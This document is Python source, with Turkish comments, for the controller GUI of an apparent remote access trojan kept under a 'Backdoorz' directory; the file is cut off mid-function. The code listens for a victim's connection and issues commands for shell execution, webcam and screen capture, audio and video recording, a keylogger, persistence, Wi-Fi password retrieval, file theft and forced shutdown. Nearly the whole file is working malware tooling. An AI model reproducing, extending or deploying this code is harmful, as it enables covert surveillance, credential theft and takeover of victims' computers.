import subprocess
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit,QLineEdit,QScrollArea,QLabel,QFileDialog,QInputDialog,QPushButton,QMenu,QAction, QSplashScreen
from PyQt5 import QtCore
from PyQt5.QtCore import Qt,QTimer
from PyQt5 import QtWidgets
from PyQt5.QtGui import QPixmap, QFont
from PyQt5.QtWidgets import QVBoxLayout
from Gui import Ui_MainWindow
from PyQt5.QtCore import pyqtSlot, pyqtSignal,QCoreApplication,QProcess,QRect
import socket
import simplejson,time,base64,os,sys,threading
from datetime import datetime
global ip,port
Kontrol_sayi=0
Yeni_socket=""
download_name=""

class SplashScreenApp:
    def __init__(self):
        self.app = QApplication(sys.argv)
        self.show_splash_screen()

    def show_splash_screen(self):

        splash_pix = QPixmap(":/icon/Adsız6.png") #Açılış ekranı için bir resim kullanın

        self.splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
        self.splash.setWindowFlag(Qt.FramelessWindowHint)  # Başlık çubuğunu kaldır
        self.splash.setAttribute(Qt.WA_TranslucentBackground)  # Arkaplanı şeffaf yap
        self.splash.show()

        QTimer.singleShot(3000, self.show_main_window)  # Açılış ekranını 3 saniye göster

        self.app.exec_()

    def show_main_window(self):
        self.splash.close()
        self.main_window = dersler_7()
        self.main_window.show()

class dersler_7(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        try:
            global ip,port
            self.ui.push_dinle.clicked.connect(self.listen)
            try:
                self.ui.push_cmd_calistir.clicked.connect(self.cmd)
                self.ui.push_snap.clicked.connect(self.snap)
                self.ui.push_alert.clicked.connect(self.alert)
                self.ui.push_screenshot.clicked.connect(self.screenshot)
                self.ui.push_cmd_reset.clicked.connect(self.cmd_reset)
                self.ui.push_close.clicked.connect(self.close)
                self.ui.push_ses_kaydedici.clicked.connect(self.ses_kaydedici)
                self.ui.push_ekran_kaydedici.clicked.connect(self.ekran_kaydedici)
                self.ui.push_sound.clicked.connect(self.sound)
                self.ui.push_upload.clicked.connect(self.upload)
                self.ui.push_wallpaper.clicked.connect(self.wallpaper)
                self.ui.push_speak.clicked.connect(self.speak)
                self.ui.push_veriac.clicked.connect(self.veriac)
                self.ui.push_indirilen_veriler.clicked.connect(self.indirilen_veriler)
                self.ui.push_whoami.clicked.connect(self.whoami)
                self.ui.push_picture.clicked.connect(self.picture)
                #self.ui.push_reconnect.clicked.connect(self.reconnect)
                self.ui.push_wifi.clicked.connect(self.wifi)
                self.ui.push_shutdown.clicked.connect(self.shutdown)
                self.ui.push_crunk.clicked.connect(self.crunk)
                self.ui.push_keylogger.clicked.connect(self.keylogger)
                self.ui.push_persistence.clicked.connect(self.persistence)
                self.ui.push_tasklist.clicked.connect(self.tasklist)
                self.ui.push_video.clicked.connect(self.video)
                self.ui.push_download.clicked.connect(self.download)
            except Exception as e:
                print(e)


        except Exception as e:
            print(e)


    def json_send(self, data):
        json_data = simplejson.dumps(data)  # datayı json_data'nın içine aldık.
        self.gelen_baglanti.send(json_data.encode("utf-8"))  # açtığımız bağlantıyı kullanarak json_datayı gönderdik.
    def json_receiver(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.gelen_baglanti.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
    def json_receiver2(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.gelen_baglanti.recv(1024).decode()
                a = simplejson.loads(json_data)
                print(a)
            except ValueError:
                continue
    def listen(self):
        ip=self.ui.input_ip.text()
        port=self.ui.input_port.text()
        print("Hedef ip: ",ip)
        print("Hedef port: ",port)
        port=int(port)
        try:
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  # dinleyicimizi birden fazla kullanıma ayarladık. Yani artık tek seferlik değil.
            self.listener.bind((ip,port))  # windowstaki gibi bağlantı(windowsta bağlantının gideceği ip'yi verdik).bizim bilgisayara geldiğinden bizim ipmiz.(bizimkine bağlantı geleceğinden yine bizim ip)
            self.listener.listen(0)
            self.ui.label_islem_durumu.setText(QCoreApplication.translate("MainWindow","<html><head/><body><p><span style=\" font-size:11pt; font-weight:600; color:#ffffff;\">  Dinleme başladı  </span></p></body></html>"))
            QApplication.processEvents()
            (self.gelen_baglanti,gelen_baglanti_adresi) = self.listener.accept()
            print(str(gelen_baglanti_adresi) + " ile bağlantı kurulduu :))")
            self.ui.label_islem_durumu.setText(QCoreApplication.translate("MainWindow","<html><head/><body><p><span style=\" font-size:8pt; font-weight:600; color:#ffffff;\">"+str(gelen_baglanti_adresi) + "ile bağlantı kuruldu</span></p></body></html>"))
        except Exception as e:
            print(e)
    def cmd(self):
        komut = self.ui.input_cmd.toPlainText()
        komut = komut.split(" ") #split gelen komutu boşluktan itibaren 2'ye ayırır
        try:
            before_exec=self.ui.outputcmdlabel.text()
            self.json_send(komut)
            komut_ciktisi=self.json_receiver()
            new_exec=before_exec + "\n" + komut_ciktisi
            #Her veri geldiğinde scroll barın aşağıya inmesini otomatikleştirme:
            self.ui.outputcmdlabel.setText(new_exec)
            #    self.ui.output_cmd.verticalScrollBar().setValue(self.ui.output_cmd.verticalScrollBar().maximum())

        except Exception as e:#herhangi bir hata alınırsa program çökmesin diye try except kullandık.
            print(e)
    def snap(self):
        try:
            komut="snap"
            before_exec = self.ui.outputcmdlabel.text()
            snap="Fotoğraf çekiliyor.."
            new_exec2=before_exec + "\n" + snap
            QApplication.processEvents()
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            current_datetime = datetime.now()
            current_datetime = str(current_datetime)[:19]
            name = "snap :" + current_datetime + ".jpg"
            self.save_file(name, komut_ciktisi)
            new_exec = new_exec2 + "\nFotoğraf indirilenler klasörüne kaydedildi."
            self.ui.outputcmdlabel.setText(new_exec)
            QApplication.processEvents()
        except Exception as e:
            print(e)
    def alert(self):
        try:
            komut="alert"
            print(komut)
            before_exec = self.ui.outputcmdlabel.text()
            alert = "Uyarı mesajı çıkarılıyor.."
            new_exec2 = before_exec + "\n\n\n" + alert
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    def screenshot(self):
        try:
            komut="screenshot"
            print(komut)
            before_exec = self.ui.outputcmdlabel.text()
            screenshot = "Ekran fotoğrafı alınıyor.."
            new_exec2 = before_exec + "\n" + screenshot
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            current_datetime = datetime.now()
            current_datetime = str(current_datetime)[:19]
            name="ekran_fotoğrafı :" + current_datetime +".jpg"
            self.save_file(name,komut_ciktisi)
            new_exec = new_exec2 + "\nEkran fotoğrafı indirilenler klasörüne kaydedildi."
            self.ui.outputcmdlabel.setText(new_exec)

        except Exception as e:
            print(e)
    def cmd_reset(self):
        print("reset")
        self.ui.input_cmd.setText("")
    def close(self):
        try:
            komut="close"
            print(komut)
            before_exec = self.ui.outputcmdlabel.text()
            close = "Bağlantı kapatılıyor"
            new_exec2 = before_exec + "\n" + close
            self.ui.outputcmdlabel.setText(new_exec2)
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
            self.listener.close()
            print("Program kapandı")
            time.sleep(2)
            pencere2=dersler_7()
            pencere2.show()
            self.ui.outputcmdlabel.setText("")
            self.ui.input_cmd.setText("")
            self.ui.label_islem_durumu.setText(QCoreApplication.translate("MainWindow","<html><head/><body><p><span style=\" font-size:11pt; font-weight:600; color:#ffffff;\"> Hedef bilgileri bekleniyor..</span></p></body></html>"))
            QApplication.processEvents()

        except Exception as e:
            print(e)
    def ses_kaydedici(self):
        print("ses")
        value=self.ui.input_ses_spin.value()
        print(str(value) + " Saniyelik ses kaydı alınacak")
        try:
            komut=[]
            before_exec = self.ui.outputcmdlabel.text()
            ses = "Ses kaydediliyor"
            new_exec2 = before_exec + "\n" + ses
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            komut.append("ses")
            komut.append(value)
            print(komut[0])
            print(komut[1])
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    def ekran_kaydedici(self):
        # input_thread = threading.Thread(target=dersler_7)
        #receiver = threading.Thread(target=self.json_receiver2)
        # input_thread.start()
        # try:
        #     receiver.start()
        #     #print(receiver)
        #     print("rec")
        # except Exception as e:
        #     print(e)

        print("ekran")
        value=self.ui.input_ekrankayit_spin.value()
        print(str(value) + " Saniyelik ekran kaydı alınacak")
        try:
            komut = []
            before_exec = self.ui.outputcmdlabel.text()
            ekran_kaydi = "Ekran kaydı alınıyor.."
            new_exec2 = before_exec + "\n" + ekran_kaydi
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            komut.append("ekran_kayit")
            komut.append(value)
            print(komut[0])
            print(komut[1])
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2+ komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    def sound(self):
        print("data")
        try:
            komut = []
            before_exec = self.ui.outputcmdlabel.text()
            data = "Medya hedefe gönderiliyor.."
            new_exec2 = before_exec + "\n" + data
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            komut.append("open_sound")
            self.upload()
            komut.append(self.a)
            print(komut[0])
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    def picture(self):
        print("resim")
        try:
            komut = []
            before_exec = self.ui.outputcmdlabel.text()
            data = "Hedefte Resim açılacak"
            new_exec2 = before_exec + "\n" + data
            self.ui.outputcmdlabel.setText(new_exec2)
            komut.append("picture")
            self.upload()
            komut.append(self.a)
            print(komut[0])
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    def upload(self):
        try:
            global Kontrol_sayi
            print("upload")
            crunk_resim_konum = "/root/Backdoorz/Crunk/b.jpg"
            crunk_ses_konum = "/root/Backdoorz/Crunk/crunk_ses.mp3"
            if Kontrol_sayi==0:
                try:
                    options = QFileDialog.Options()
                    options |= QFileDialog.ReadOnly
                    file_path, _ = QFileDialog.getOpenFileName(self, 'Dosya Seç', '','Tüm Dosyalar (*);;Metin Dosyaları (*.txt);;Resim Dosyaları (*.jpg *.png)',options=options)
                    if file_path:
                        self.filePath = file_path
                        print('Seçilen dosya yolu:', self.filePath)
                except Exception as e:
                    print(e)
            elif Kontrol_sayi == 1:
                self.filePath=crunk_resim_konum

            elif Kontrol_sayi == 2:
                self.filePath=crunk_ses_konum

            komut = []
            before_exec = self.ui.outputcmdlabel.text()
            upload = "Veri Gönderiliyor"
            new_exec2 = before_exec + "\n" + upload
            self.ui.outputcmdlabel.setText(new_exec2)
            komut.append("upload")
            try:
                parts = self.filePath.rsplit("/", 1) #Her bir / işaretinden sonra böl
                self.a = parts[-1]   # En sonuncuyu a'ya eşitle. böylelikle pathin sonundaki veri neyse uzantısıyla birlikte almış olduk (flag.txt)
                komut.append(self.a)
            except Exception as e:
                print(e)
            komut.append(self.upload_2(self.filePath))
            print(komut[0])
            print(komut[1])
            print(komut[2])
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    def upload_2(self,path):
        try:
            print("a")
            with open(path,"rb") as file: #ikilik sistemde okuduk read binary, Hata olmaması için. ve file ile birlikte açtık.
                return base64.b64encode(file.read()) #ikilik sistemde okuduğumuz dosyayı encode ettik ve artık göndermeye hazır.
        except Exception as e:
            print(e)
    def wallpaper(self):
        print("wallpaper")
        try:
            komut = []
            print(komut)
            before_exec = self.ui.outputcmdlabel.text()
            wallpaper = "Hedefin arkaplanı değişiyor"
            new_exec2 = before_exec + "\n" + wallpaper
            self.ui.outputcmdlabel.setText(new_exec2)
            komut.append("wallpaper")
            self.upload()
            komut.append(self.a)
            print(komut)
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)

        except Exception as e:
            print(e)
    def speak_input(self):
        try:
            self.text, ok_pressed = QInputDialog.getText(self, 'Input Al', 'Lütfen bir metin girin:')
        except Exception as e:
            print(e)
    def speak(self):
        try:
            print("speak")
            self.speak_input()
            print(self.text)
            speak_text=self.text.split()
            try:
                komut = []
                print(komut)
                before_exec = self.ui.outputcmdlabel.text()
                speak = "Hedefte kelimeler okunacak"
                new_exec2 = before_exec + "\n" + speak
                self.ui.outputcmdlabel.setText(new_exec2)
                komut.append("speak")
                komut.append(speak_text)
                print(komut)
                self.json_send(komut)
                komut_ciktisi = self.json_receiver()
                new_exec = new_exec2 + "\n" + komut_ciktisi
                self.ui.outputcmdlabel.setText(new_exec)

            except Exception as e:
                print(e)
        except Exception as e:
            print(e)

    def veriac(self):
        try:
            linux_check="uname"
            result = subprocess.check_output(linux_check,shell=True)
            result=result.decode()
            if 'Linux' in result:
                print("İşletim sistemi linux")
                Dizin="/root"
                adi="Backdoorz/Downloads"
                klasor_yolu=Dizin+"/"+adi
                print(klasor_yolu)
                if not os.path.exists(klasor_yolu):
                    yeni_klasor_yolu = os.path.join(Dizin, adi)
                    os.makedirs(yeni_klasor_yolu)
                konum="/root/Backdoorz/Downloads/"
                subprocess.run(['xdg-open', konum])
                #subprocess.call("touch b.txt")
                print("b")
            else:
                print(result)
                print("Bilinmiyor")
        except Exception as e:
            print(e)

    def indirilen_veriler(self):
        try:
            indirilenler_menu = QMenu(self)
            ekran_kayit_download = QAction("Kaydedilen ekran kaydını al", self)
            ses_kayit_download = QAction("Kaydedilen ses kaydını al", self)
            video_kayit_download = QAction("Kaydedilen video kaydını al", self)
            keylogger_kayit_download = QAction("Kaydedilen keylogger verilerini al", self)

            ekran_kayit_download.triggered.connect(self.indirilenler_option_selected)
            ses_kayit_download.triggered.connect(self.indirilenler_option_selected)
            video_kayit_download.triggered.connect(self.indirilenler_option_selected)
            keylogger_kayit_download.triggered.connect(self.indirilenler_option_selected)

            indirilenler_menu.addAction(ekran_kayit_download)
            indirilenler_menu.addAction(ses_kayit_download)
            indirilenler_menu.addAction(video_kayit_download)
            indirilenler_menu.addAction(keylogger_kayit_download)

            self.ui.push_indirilen_veriler.setMenu(indirilenler_menu)
        except Exception as e:
            print(e)

    def whoami(self):
        try:
            komut = "whoami"
            print(komut)
            before_exec = self.ui.outputcmdlabel.text()
            new_exec2 = before_exec + "\n"
            self.ui.outputcmdlabel.setText(new_exec2)
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)
    #Reconnect sorunlu:
    def reconnect(self):
        print("a")
        try:
            komut = "reconnect"
            before_exec = self.ui.outputcmdlabel.text()
            reconnect = "Bağlantı yenileniyor.."
            new_exec2 = before_exec + "\n" + reconnect
            self.ui.outputcmdlabel.setText(new_exec2)
            global port
            global ip
            global Kontrol_sayi
            global Yeni_socket
            try:
                if Kontrol_sayi == 0:
                    try:
                        self.json_send(komut)
                        self.listener.close()
                    except Exception as a:
                        print(a)
                    print("bağlantı kapandı")

                    try:
                        print("soket oluştu")
                        Yeni_socket = ("Yeni_socketimiz") + str(Kontrol_sayi)
                        Yeni_socket = dersler_7.listen()
                        Kontrol_sayi += 1
                        print("oluştu")


                    except Exception as e:
                        print(e)
                    # self.command_execution(command_input)
                    #continue

                else:
                    print("else")
                    try:
                        self.json_send(komut)
                        self.listener.close()
                    except Exception as a:
                        print(a)
                    print("Bağlantı kapandı")

                    try:
                        print("else soket oluşucak")
                        Yeni_socket = ("Yeni_socketimiz") + str(Kontrol_sayi)
                        Yeni_socket = self.listen()
                        Kontrol_sayi += 1

                    except Exception as e:
                        print(e)
                    # self.command_execution(command_input)

                    #continue
                    print("hatasız ")
                    komut_ciktisi = self.json_receiver()
                    new_exec = new_exec2 + "\n" + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)

            except Exception as e:
                print(e)


        except Exception as e:
            print(e)
    def wifi(self):
        try:
            wifi_menu = QMenu(self)
            tüm_wifi = QAction("Tüm wifi verilerini al(key hariç)", self)
            wifi_profil = QAction("Wifi profillerini al", self)
            wifi_sifre = QAction("Bir profilin şifresini al", self)

            tüm_wifi.triggered.connect(self.wifi_option_selected)
            wifi_profil.triggered.connect(self.wifi_option_selected)
            wifi_sifre.triggered.connect(self.wifi_option_selected)

            wifi_menu.addAction(tüm_wifi)
            wifi_menu.addAction(wifi_profil)
            wifi_menu.addAction(wifi_sifre)

            self.ui.push_wifi.setMenu(wifi_menu)
        except Exception as e:
            print(e)
    def tasklist(self):
        try:
            print("task")
            tasklist_menu = QMenu(self)
            process_list = QAction("Çalışan tüm uygulamaları göster", self)
            close_process = QAction("Uygulamayı kapat", self)
            process_list.triggered.connect(self.tasklist_option_selected)
            close_process.triggered.connect(self.tasklist_option_selected)
            tasklist_menu.addAction(process_list)
            tasklist_menu.addAction(close_process)

            self.ui.push_tasklist.setMenu(tasklist_menu)
        except Exception as e:
            print(e)
    def shutdown(self):
        try:
            shutdown_menu = QMenu(self)
            restart = QAction("Bilgisayarı yeniden başlat", self)
            close = QAction("Bilgisayarı uyarı çıkarmadan hemen kapat", self)
            close_time = QAction("Bilgisayarı şu kadar süre sonra kapat:", self)
            close_time_cancel = QAction("Süreli kapatmayı iptal et", self)

            restart.triggered.connect(self.shutdown_option_selected)
            close.triggered.connect(self.shutdown_option_selected)
            close_time.triggered.connect(self.shutdown_option_selected)
            close_time_cancel.triggered.connect(self.shutdown_option_selected)

            shutdown_menu.addAction(restart)
            shutdown_menu.addAction(close)
            shutdown_menu.addAction(close_time)
            shutdown_menu.addAction(close_time_cancel)

            self.ui.push_shutdown.setMenu(shutdown_menu)
        except Exception as e:
            print(e)

    def crunk(self):
        print("crunk")
        try:
            crunk_menu = QMenu(self)
            wallpaper = QAction("Duvar kağıdını default olarak değiştir", self)
            hack_sound = QAction("Default sesi bilgisayarda çal", self)
            resim_acma = QAction("Notepad'i açıp yazı yaz", self)
            #Mouse'ı hareket ettirme

            wallpaper.triggered.connect(self.crunk_option_selected)
            hack_sound.triggered.connect(self.crunk_option_selected)
            resim_acma.triggered.connect(self.crunk_option_selected)
            crunk_menu.addAction(wallpaper)
            crunk_menu.addAction(hack_sound)
            crunk_menu.addAction(resim_acma)
            self.ui.push_crunk.setMenu(crunk_menu)

        except Exception as e:
            print(e)

    def persistence(self):
        try:
            komut = "persistence"
            print(komut)
            before_exec = self.ui.outputcmdlabel.text()
            new_exec2 = before_exec + "\n"
            self.ui.outputcmdlabel.setText(new_exec2)
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
        except Exception as e:
            print(e)

    def keylogger(self):
        print("keylogger")
        try:
            keylogger_menu = QMenu(self)
            keylogger_start = QAction("Keylogger'ı başlat", self)
            keylogger_stop = QAction("Keylogger'ı durdur", self)

            keylogger_start.triggered.connect(self.keylogger_option_selected)
            keylogger_stop.triggered.connect(self.keylogger_option_selected)
            keylogger_menu.addAction(keylogger_start)
            keylogger_menu.addAction(keylogger_stop)
            self.ui.push_keylogger.setMenu(keylogger_menu)

        except Exception as e:
            print(e)

    def video(self):
        try:
            print("video")
            value = self.ui.input_video_spin.value()
            print(str(value) + " Saniyelik video kaydı alınacak")
            komut = []
            before_exec = self.ui.outputcmdlabel.text()
            ses = "Kayıt alınıyor.."
            new_exec2 = before_exec + "\n" + ses
            self.ui.outputcmdlabel.setText(new_exec2)
            QApplication.processEvents()
            komut.append("video")
            komut.append(value)
            print(komut[0])
            print(komut[1])
            self.json_send(komut)
            komut_ciktisi = self.json_receiver()
            new_exec = new_exec2 + "\n" + komut_ciktisi
            self.ui.outputcmdlabel.setText(new_exec)
            QApplication.processEvents()
        except Exception as e:
            print(e)

    def download(self):
        try:
            global download_name
            print("Download")
            komut=[]
            komut.append("download")
            download_name, ok_pressed = QInputDialog.getText(self, "", "İndirmek istediğiniz verinin adını giriniz:")
            if ok_pressed:
                komut.append(download_name)
            print(download_name)
            try:
                print(komut)
                before_exec = self.ui.outputcmdlabel.text()
                new_exec2 = before_exec + "\nVeri alınıyor.."
                self.ui.outputcmdlabel.setText(new_exec2)
                QApplication.processEvents()
                self.json_send(komut)
                komut_ciktisi = self.json_receiver()
                self.save_file(download_name,komut_ciktisi)
                new_exec = new_exec2 + "\n" + "Veri indirilenler dizinine başarıyla kaydedildi."
                self.ui.outputcmdlabel.setText(new_exec)
            except Exception as e:
                print(e)
        except Exception as e:
            print(e)
    def save_file(self,path,content): #yolu ve veriyi aldık.
        try:
            klasor_adi="/root/Backdoorz/Downloads"
            dosya_yolu = os.path.join(klasor_adi, path)

            # Dosyayı yaz
            with open(dosya_yolu, "wb") as kaydedilen_veri:
                kaydedilen_veri.write(base64.b64decode(content))

        except Exception as e:
            return f"Hata: {str(e)}"
        #     with open(dosya_yolu, 'w') as kaydedilen_veri:
        #         with open(path,"wb") as kaydedilen_veri:   #write binary 2lik sistemde kaydedilen_veri nin içine yazdık.
        #             kaydedilen_veri.write(base64.b64decode(content))
        #             return "Veri aktarimi basarili.."
        # except Exception as e:
        #     print(e)

    #Selected Menus
    def indirilenler_option_selected(self):
        try:
            komut=[]
            selected_action = self.sender()
            print("Seçilen seçenek:", selected_action.text())
            secenek=selected_action.text()
            komut.append("indir")
            print("indir")
            try:
                if "ekran" in secenek:
                    print("ekran")
                    komut.append("ekran")
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\nKaydedilen ekran kaydı alınıyor..Lütfen işlem yapmadan bekleyin."
                    self.ui.outputcmdlabel.setText(new_exec2)
                    QApplication.processEvents()
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    current_datetime = datetime.now()
                    current_datetime = str(current_datetime)[:19]
                    if komut_ciktisi[1]=="yok":
                        new_exec = new_exec2 + "\nBöyle bir kayıt yok, önce kayıt almalısınız."
                        self.ui.outputcmdlabel.setText(new_exec)
                        QApplication.processEvents()
                    else:
                        print(komut_ciktisi[1])
                        print("tamam")
                        name = "Ekran kaydı:" + current_datetime + ".avi"
                        self.save_file(name, komut_ciktisi[1])
                        new_exec = new_exec2 + "\nKaydedilen ekran kaydı indirilenler klasörüne alındı."
                        self.ui.outputcmdlabel.setText(new_exec)
                        QApplication.processEvents()
                elif "ses" in secenek:
                    print("ses")
                    komut.append("ses")
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n\nKaydedilen ses kaydı alınıyor..Lütfen işlem yapmadan bekleyin.\n"
                    self.ui.outputcmdlabel.setText(new_exec2)
                    QApplication.processEvents()
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    current_datetime = datetime.now()
                    current_datetime = str(current_datetime)[:19]
                    if komut_ciktisi[1]=="yok":
                        new_exec = new_exec2 + "\nBöyle bir kayıt yok, önce kayıt almalısınız."
                        self.ui.outputcmdlabel.setText(new_exec)

                    else:
                        print(komut_ciktisi[1])
                        print("tamam")
                        name = "Ses kaydı:" + current_datetime + ".wav"
                        self.save_file(name, komut_ciktisi[1])
                        new_exec = new_exec2 + "\nKaydedilen ses kaydı indirilenler klasörüne alındı."
                        self.ui.outputcmdlabel.setText(new_exec)

                elif "video" in secenek:
                    print("video")
                    komut.append("video")
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\nKaydedilen video kaydı alınıyor..Lütfen işlem yapmadan bekleyin."
                    self.ui.outputcmdlabel.setText(new_exec2)
                    QApplication.processEvents()
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    current_datetime = datetime.now()
                    current_datetime = str(current_datetime)[:19]
                    if komut_ciktisi[1]=="yok":
                        new_exec = new_exec2 + "\nBöyle bir kayıt yok, önce kayıt almalısınız."
                        self.ui.outputcmdlabel.setText(new_exec)

                    else:
                        print(komut_ciktisi[1])
                        print("tamam")
                        name = "Video kaydı:" + current_datetime + ".avi"
                        self.save_file(name, komut_ciktisi[1])
                        new_exec = new_exec2 + "\nKaydedilen video kaydı indirilenler klasörüne alındı."
                        self.ui.outputcmdlabel.setText(new_exec)

                elif "keylogger" in secenek:
                    print("keylogger")
                    komut.append("keylogger")
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\nKaydedilen keylogger kayıtları alınıyor..Lütfen işlem yapmadan bekleyin."
                    self.ui.outputcmdlabel.setText(new_exec2)
                    QApplication.processEvents()
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    current_datetime = datetime.now()
                    current_datetime = str(current_datetime)[:19]
                    if komut_ciktisi[1]=="yok":
                        new_exec = new_exec2 + "\nBöyle bir kayıt yok, önce kayıt almalısınız."
                        self.ui.outputcmdlabel.setText(new_exec)

                    else:
                        print(komut_ciktisi[1])
                        print("tamam")
                        name = "Keylogger kaydı:" + current_datetime + ".txt"
                        self.save_file(name, komut_ciktisi[1])
                        new_exec = new_exec2 + "\nKaydedilen keylogger kayıtları indirilenler klasörüne alındı."
                        self.ui.outputcmdlabel.setText(new_exec)
         


            except Exception as e:
                print(e)
        except Exception as e:
            print(e)
    def keylogger_option_selected(self):
        try:
            komut = []
            selected_action = self.sender()
            print("Seçilen seçenek:", selected_action.text())
            secenek = selected_action.text()
            komut.append("keylogger")
            try:
                if "başlat" in secenek:
                    print("başlat")
                    komut.append("start")
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n"
                    self.ui.outputcmdlabel.setText(new_exec2)
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    new_exec = new_exec2 + "\n" + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)

                elif "durdur" in secenek:
                    print("durdur")
                    komut.append("stop")
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n"
                    self.ui.outputcmdlabel.setText(new_exec2)
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    # current_datetime = datetime.now()
                    # current_datetime = str(current_datetime)[:19]
                    # name = "Keylogger_kayitlari :" + current_datetime + ".txt"
                    # self.save_file(name, komut_ciktisi)
                    new_exec = new_exec2 + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)


            except Exception as e:
                print(e)
        except Exception as e:
            print(e)
    def crunk_option_selected(self):
        try:
            komut = []
            selected_action = self.sender()
            print("Seçilen seçenek:", selected_action.text())
            secenek = selected_action.text()
            global Kontrol_sayi

            if "Duvar" in secenek:
                Kontrol_sayi = 1
                print("Duvar kağıdı")
                self.wallpaper()
                print("değişti")
                Kontrol_sayi = 0

            elif "sesi" in secenek:
                print("Ses")
                Kontrol_sayi = 2
                self.sound()
                print("ses çalındı mı")
                Kontrol_sayi = 0

            elif "yaz" in secenek:
                komut.append("crunk")
                print("crunk")
                print("yazı")
                komut.append("notepad")
                text, ok_pressed = QInputDialog.getText(self, "", "Yazdırmak istediğiniz yazıyı giriniz:")
                if ok_pressed:
                    komut.append(text)
                print(text)
            try:
                print(komut)
                before_exec = self.ui.outputcmdlabel.text()
                new_exec2 = before_exec + "\n"
                self.ui.outputcmdlabel.setText(new_exec2)
                self.json_send(komut)
                komut_ciktisi = self.json_receiver()
                new_exec = new_exec2 + "\n" + komut_ciktisi
                self.ui.outputcmdlabel.setText(new_exec)
            except Exception as e:
                print(e)
        except Exception as e:
            print(e)
    def shutdown_option_selected(self):
        try:
            komut = []
            selected_action = self.sender()
            print("Seçilen seçenek:", selected_action.text())
            secenek = selected_action.text()
            komut.append("shutdown")
            if "yeniden" in secenek:
                print("restart")
                komut.append("restart")
                komut.append("shutdown /r")
                try:
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n"
                    self.ui.outputcmdlabel.setText(new_exec2)
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    print(komut_ciktisi)
                    new_exec = new_exec2 + "\n" + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)
                except Exception as e:
                    print(e)

            elif "hemen" in secenek:
                print("close")
                komut.append("close")
                komut.append("shutdown /s")
                try:
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n"
                    self.ui.outputcmdlabel.setText(new_exec2)
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    print(komut_ciktisi)
                    new_exec = new_exec2 + "\n" + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)
                except Exception as e:
                    print(e)

            elif "süre" in secenek:
                print("close_time")
                komut.append("close_time")
                time, ok_pressed = QInputDialog.getText(self, "", "Saniyeyi Giriniz:")
                if ok_pressed:
                    komut.append(time)
                print(int(time))
                try:
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n"
